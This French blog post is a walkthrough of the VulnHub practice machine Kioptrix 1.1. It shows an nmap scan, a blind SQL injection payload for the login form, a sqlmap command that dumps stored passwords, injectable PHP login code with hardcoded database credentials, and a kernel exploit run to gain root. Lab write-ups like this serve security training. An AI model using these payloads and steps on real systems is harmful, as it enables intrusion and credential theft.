# Solution du CTF Kioptrix: 1.1 de VulnHub

Après un temps... quelque peu plus long que prévu, *SourceForge* a pu régler les derniers bugs provoqués par sa mise à jour et je peux enfin poster à nouveaux des articles.  

Comme prévu les walkthroughs à venir concernent la saga *Kioptrix*, ici il s'agit de [l'épisode 1.1](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/) qui est bien le second et non une mise à jour du premier.  

Web exploitation 101
--------------------

```plain
Nmap scan report for 192.168.1.39
Host is up (0.00021s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            681/udp  status
|_  100024  1            684/tcp  status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-07T23:10:47+00:00
|_Not valid after:  2010-10-07T23:10:47+00:00
|_ssl-date: 2018-02-13T20:41:56+00:00; +4h59m59s from local time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods: Potentially risky methods: PUT
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_http-title: 403 Forbidden
684/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
```

Le site web dispose d'une page de login très basique (champs user, password, bouton submit). *Wapiti* n'en fait qu'une bouchée :  

```plain
[*] Lancement du module blindsql
---
Faille d'injection SQL en aveugle dans http://192.168.1.39/index.php via une injection dans le paramètre uname
Evil request:
    POST /index.php HTTP/1.1
    Host: 192.168.1.39
    Referer: http://192.168.1.39/
    Content-Type: application/x-www-form-urlencoded

    uname=%27%20or%20benchmark%2810000000%2CMD5%281%29%29%231&psw=letmein&btnLogin=Login
---
```

On enchaîne avec *sqlmap*, son meilleur ami :  

```bash
python sqlmap.py -u http://192.168.1.39/index.php --data "uname=Administrator&psw=test&btnLogin=Login" --risk 3 --level 5
```

Après avoir obtenu le nom de la base de données et des tables intéressantes on peut dumper le contenu de la table users avec *-D webapp -T users --dump*  

```plain
Database: webapp
Table: users
[2 entries]
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
| 1  | admin    | 5afac8d85f |
| 2  | john     | 66lajGGbla |
+----+----------+------------+
```

Avec ces identifiants on peut passer la page de login et on tombe sur une classique faille d'exécution de commande :  

![Kioptrix 1.1 ping command execution](https://raw.githubusercontent.com/devl00p/blog/master/images/kioptrix/kioptrix2.png)

On en profite pour chercher quelques identifiants :  

```php
<?php
	mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
	//print "Connected to MySQL<br />";
	mysql_select_db("webapp");

	if ($_POST['uname'] != ""){
		$username = $_POST['uname'];
		$password = $_POST['psw'];
		$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
		//print $query."<br>";
		$result = mysql_query($query);

		$row = mysql_fetch_array($result);
		//print "ID: ".$row['id']."<br />";
	}

?>
```

20CentOS
--------

Les identifiants ne permettent pas d'accéder aux comptes présents (*harold* et *john*) mais comme c'est un *Kioptrix* il suffit de chercher le bon exploit pour le système :  

```plain
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux

LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
Distributor ID: CentOS
Description:    CentOS release 4.5 (Final)
Release:        4.5
Codename:       Final
```

Ce qui nous amène à [une faille](https://www.exploit-db.com/exploits/9542/) découverte par *Tavis Ormandy* et *Julien Tinnes* touchant le kernel.  

```plain
bash-3.00$ gcc -o sploit sploit.c
gcc -o sploit sploit.c
sploit.c:109:28: warning: no newline at end of file
bash-3.00$ ./sploit
./sploit
sh-3.00# id
id
uid=0(root) gid=0(root) groups=48(apache)
```

Au suivant !  


*Published February 22 2018 at 12:13*